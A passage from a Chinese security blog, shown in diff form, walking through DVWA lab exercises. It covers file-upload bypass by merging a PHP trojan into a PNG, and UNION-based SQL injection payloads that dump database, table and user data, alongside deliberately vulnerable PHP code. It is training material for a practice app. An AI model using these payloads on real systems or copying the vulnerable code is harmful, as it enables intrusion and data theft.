substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); </span><br><span class="line">    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>strrpos(string,find,start)</li>
+</ul>
+<p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p>
+<ul>
+<li>getimagesize(string filename)</li>
+</ul>
+<p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
+<ul>
+<li>strtolower()函数</li>
+</ul>
+<p>把字符串转换为小写。</p>
+<p>HIGH级别的代码加了检查文件后缀名</p>
+<p>让getimagesize()函数检测无效的方法：文件头欺骗，继而使得getimagesize函数无法判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JPEG/JPG - 文件头标识 (2 bytes): FF D8 (SOI) (JPEG 文件标识) - 文件结束标识 (2 bytes): FF D9 (EOI) </span><br><span class="line"> </span><br><span class="line">PNG - 文件头标识 (8 bytes)   89 50 4E 47 0D 0A 1A 0A</span><br><span class="line"> </span><br><span class="line">GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61 |GIF89(7)a</span><br></pre></td></tr></table></figure></p>
+<p>这里有两种上传绕过的方法，</p>
+<ul>
+<li><ol>
+<li>合并两个文件（一个是木马文件，另一个是图片文件）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy y.png/b+x.php/a z.png</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+<p>copy命令中的两个文件的位置不能颠倒，否则生成的文件格式无效。<br><br>合并后的z.png如下:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/NBW7EINLW8U@%7B%60%5B_JV_W6%7DD.png" alt="image"></p>
+<ul>
+<li>2.结合文件包含漏洞</li>
+</ul>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务端核心代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); </span><br><span class="line">    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; </span><br><span class="line">    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;; </span><br><span class="line">    //$target_file   = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;; </span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span><br><span class="line">        if( $uploaded_type == &apos;image/jpeg&apos; ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, 100); </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, 9); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the web root from the temp folder? </span><br><span class="line">        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&lt;a href=&apos;$&#123;target_path&#125;$&#123;target_file&#125;&apos;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // No </span><br><span class="line">            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Delete any temp files </span><br><span class="line">        if( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-DVWA之SQL Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/DVWA之SQL Injection/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.554Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/DVWA之SQL Injection/">DVWA之SQL Injection</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>参考链接:<a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/120747.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里首先你最好懂一些mysql查询语句，便于理解</span><br></pre></td></tr></table></figure></p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL Injection（SQL注入）是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。</p>
+<h2 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h2><ul>
+<li>判断是否存在注入，注入是字符型还是数字型</li>
+<li>判断SQL查询语句中的字段数</li>
+<li>爆出当前数据库</li>
+<li>爆出数据库中的表</li>
+<li>爆出表中的字段名</li>
+<li>爆出该表的字段名的内容<h2 id="DVWA测试实战"><a href="#DVWA测试实战" class="headerlink" title="DVWA测试实战"></a>DVWA测试实战</h2><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2>服务端核心代码:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $id = $_REQUEST[ &apos;id&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; </span><br><span class="line">    $result = mysql_query( $query ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        $first = mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  = mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOW级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。（现实中攻击者是看不到后端代码的，这里放出是为了参考学习).</span><br></pre></td></tr></table></figure>
+<p>这里先说明什么是字符型和数字型,百度一个详解(可能一开始不理解，做做下面题就会理解了):<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字型： SELECT 列 FROM 表 WHERE 数字型列=值</span><br><span class="line">字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’</span><br><span class="line">搜索型： SELECT * FROM 表 WHERE where 被搜索的列 like ‘%值%’</span><br></pre></td></tr></table></figure></p>
+<h3 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h3><ul>
+<li><p>输入1,查询成功:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/U%7BIH6S60HY~M9%7D%29@%60_Z%29@36.png" alt="image"></p>
+</li>
+<li><p>输出1’,发现语法报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这是因为，LOW有一行代码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>输入’是为了闭合前面的单引号，但是后面还有一个单引号没闭合，相当于 user_id = ‘1’’<br></p>
+<p>可以在后面再加一个#来注释掉后面的单引号<br></p>
+<p>最后这两步说明了存在字符型注入</p>
+<h3 id="判断SQL查询语句中的字段数"><a href="#判断SQL查询语句中的字段数" class="headerlink" title="判断SQL查询语句中的字段数"></a>判断SQL查询语句中的字段数</h3><p>这里有两种方法，根据具体情况而定.</p>
+<ul>
+<li>输入: 1’ order by 2 #<br><img src="http://p1vrkwaxt.bkt.clouddn.com/ZLWXS~0NV%5DDL%7B7I@GX6XY2W.png" alt="image"></li>
+<li>输入: 1’ order by 3 #<br><img src="http://p1vrkwaxt.bkt.clouddn.com/%5D%7DIR%5BFH6QX7EGY0%2873U7$CP.png" alt="image"><br><br><br>说明只存在两个字段,具体解释<a href="https://blog.csdn.net/lingxyd_0/article/details/2653187" target="_blank" rel="noopener">https://blog.csdn.net/lingxyd_0/article/details/2653187</a><br></li>
+</ul>
+<p>另外一种方法与上面区别是更容易分清</p>
+<ul>
+<li>输入: 0’ union select 1,2#<br><img src="http://p1vrkwaxt.bkt.clouddn.com/~2PAZGDYQ%605L_A7F9AQJ3_P.png" alt="image"></li>
+<li>注意，这里的union相当于数学中的并(且),即联合查询，相当于</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx where id = &apos;0&apos; union select 1,2#</span><br></pre></td></tr></table></figure>
+<p>这里的0是为了让前面的select语句查询不到，从而保证只查到后面的select，便于分清.<br><br></p>
+<ul>
+<li>输入: 0’ union select 1,2,3#<br><img src="http://p1vrkwaxt.bkt.clouddn.com/Q3DI~CC70WY6CR9A%5D5%7D_7%28A.png" alt="image"><br><br>也同样说明只存在两个字段</li>
+</ul>
+<h3 id="爆出当前数据库"><a href="#爆出当前数据库" class="headerlink" title="爆出当前数据库"></a>爆出当前数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select 1,database()#</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/VO79A%5BEX835M~CGG%28S%291E_B.png" alt="image"><br>说明当前数据库为dvwa</p>
+<h3 id="爆出数据库中的表"><a href="#爆出数据库中的表" class="headerlink" title="爆出数据库中的表"></a>爆出数据库中的表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#)</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/GR%7DE%28IF0DH4V4KGEBGE%5B%7BH7.png" alt="image"></p>
+<ul>
+<li>group_concat() 简单来说就是把查询到的table_name都收集起来，具体解释可以百度</li>
+<li>information_schema.tables是mysql数据库一个特殊的东西，代表这个数据库中的所有表</li>
+<li>table_schema 中文翻译是表模式，相当于数据库</li>
+</ul>
+<h3 id="爆出表中的字段名"><a href="#爆出表中的字段名" class="headerlink" title="爆出表中的字段名"></a>爆出表中的字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;#</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/IL6G%608A3W%28UY%7DZ9DLXS67GK.png" alt="image"><br>语法跟上面差不多，改了column字段</p>
+<h3 id="爆出该表的字段名的内容"><a href="#爆出该表的字段名的内容" class="headerlink" title="爆出该表的字段名的内容"></a>爆出该表的字段名的内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select 1,last_name from users #</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/S%29TQF%29_RTC3%5D%25D@9~7%25%60N8H.png" alt="image"><br>爆出字段last_name字段的内容</p>
+<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>服务端核心代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $id = $_POST[ &apos;id&apos; ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; </span><br><span class="line">    $result = mysql_query( $query ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        // Display values </span><br><span class="line">        $first = mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  = mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到相比low多了一行代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string($id);</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/0VOV%5DS%28LG_7%28$O6@4S7AOAA.png" alt="image"></p>
+<p>所以说这儿的单引号没法用了被转义了,同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/36~%60MBJD2E%5D8YXI%25FS1Q%7B_A.png" alt="image"></p>
+<p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数</p>
+<h3 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h3><ul>
+<li>抓包更改参数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; or 1 =1#</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/$S%60~IRQ_VC%5DZNN%29DQ5B%7D58V.png" alt="image"></p>
+<p>发现报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 or 1 =1#</span><br></pre></td></tr></table></figure>
+<p>正常，说明存在数字型注入<br></p>
+<h3 id="判断SQL查询语句中的字段数-1"><a href="#判断SQL查询语句中的字段数-1" class="headerlink" title="判断SQL查询语句中的字段数"></a>判断SQL查询语句中的字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2#</span><br></pre></td></tr></table></figure>
+<p>确定字段有两个<br></p>
+<h3 id="爆出当前数据库-1"><a href="#爆出当前数据库-1" class="headerlink" title="爆出当前数据库"></a>爆出当前数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,database()#</span><br></pre></td></tr></table></figure>
+<h3 id="爆出数据库中的表-1"><a href="#爆出数据库中的表-1" class="headerlink" title="爆出数据库中的表"></a>爆出数据库中的表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()#</span><br></pre></td></tr></table></figure>
+<h3 id="爆出表中的字段名-这里有个不一样"><a href="#爆出表中的字段名-这里有个不一样" class="headerlink" title="爆出表中的字段名(这里有个不一样)"></a>爆出表中的字段名(这里有个不一样)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(column_name) from information_schema.columns where table_name = &apos;users&apos;#</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/6B981WS5387VOUV84II%60FV0.png" alt="image"></p>
+<p>发生报错，这是因为单引号被转义成\，这里有一个绕过办法，就是十六进制绕过，将user转成十六进制即可.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(column_name) from information_schema.columns where table_name = 0×7573657273 #</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/IIMUE%296P3%5DI_%60W%28%7BGZYEHXF.png" alt="image"></p>
+<p>成功查询</p>
+<h3 id="爆出该表的字段名的内容-1"><a href="#爆出该表的字段名的内容-1" class="headerlink" title="爆出该表的字段名的内容"></a>爆出该表的字段名的内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,user_id from users#</span><br></pre></td></tr></table></figure>
+<p>成功爆出users表下的user_id内容<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/1L@O_1TD%60%5B8X2@P7Y0Z6A8J.png" alt="image"></p>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>服务端核心代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &apos;id&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $id = $_SESSION[ &apos;id&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;&quot;; </span><br><span class="line">    $result = mysql_query( $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        $first = mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  = mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到他这里增加了limit语句,limit 1表示只能查询到一条内容，具体sql limit原理:<a href="https://blog.csdn.net/sinat_36246371/article/details/54582904" target="_blank" rel="noopener">https://blog.csdn.net/sinat_36246371/article/details/54582904</a><br><br></p>
+<p>不过我们仍然可以用 # 将后面的limt 1注释掉，剩下的步骤与low级别是一样的，它这个limit主要是为了防备sqlmap,因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务端核心代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 